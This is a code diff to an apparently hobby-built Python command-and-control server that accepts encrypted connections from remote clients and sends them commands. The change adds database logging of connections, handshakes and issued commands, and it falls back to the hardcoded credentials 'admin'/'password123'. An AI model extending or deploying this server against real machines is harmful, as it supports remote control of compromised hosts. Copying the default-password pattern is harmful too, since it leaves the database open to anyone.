@@ -5,17 +5,26 @@ from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 from cryptography.hazmat.primitives.asymmetric import ec
 from cryptography.hazmat.primitives import hashes, serialization
 from cryptography.hazmat.primitives.kdf.hkdf import HKDF
+import dbManager
 
 class C2Server:
     """
     encryption- asymmetric (RSA) for key exchange, symmetric (AES) for commands/data
     """
     def __init__(self, host='0.0.0.0', port=5555):
+        db_params = {
+            'host': os.getenv('DB_HOST', 'localhost'),
+            'dbname': os.getenv('DB_NAME', 'c2_db'),
+            'user': os.getenv('DB_USER', 'admin'),
+            'password': os.getenv('DB_PASS', 'password123')
+        }
+        self.db = dbManager.DatabaseManager(db_params)
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #tcp
         self.server_socket.bind((host, port))
         self.server_socket.listen(5) # up to 5 clients
         self.clients = {}  # {id: (socket, address, key)}
         self.client_id_counter = 1
+        self.db.log_event("INFO", "ServerInit", f"Server started on {host}:{port}")
 
     def init_handshake(self, client_socket):
         server_private = ec.generate_private_key(ec.SECP256R1())
@@ -47,14 +56,17 @@ class C2Server:
         print(f"[*] Server started on {self.server_socket.getsockname()}")
         while True:
             client_socket, addr = self.server_socket.accept()
+            self.db.log_event("INFO", "Network", f"Connection attempt", addr)
             try:
                 cid = self.client_id_counter
                 client_key = self.init_handshake(client_socket) 
                 self.clients[cid] = (client_socket, addr, client_key)
                 print(f"\n[+] New Connection: {addr} (Assigned ID: {cid})")
                 self.client_id_counter += 1
+                self.db.log_event("INFO", "Handshake", "Success", addr)
             except Exception as e:
                 print(f"[-] Error handling client {addr}: {e}")
+                self.db.log_event("ERROR", "Handshake", f"Failed for {e}", addr)
                 client_socket.close()
 
     def send_command(self, client_id, cmd):
@@ -72,8 +84,10 @@ class C2Server:
             else:
                 response = self.decrypt_data(client_socket.recv(1024), client_key)
                 print(f"[*] Response from Client {client_id}: {response}")
+            self.db.log_command(client_id, cmd, response)
         except Exception as e:
             print(f"[-] Error communicating with client {client_id}: {e}")
+            self.db.log_event("ERROR", "Communication", f"Failed for {e}", self.clients[client_id][1])
             del self.clients[client_id]
 
     def run_cli(self):
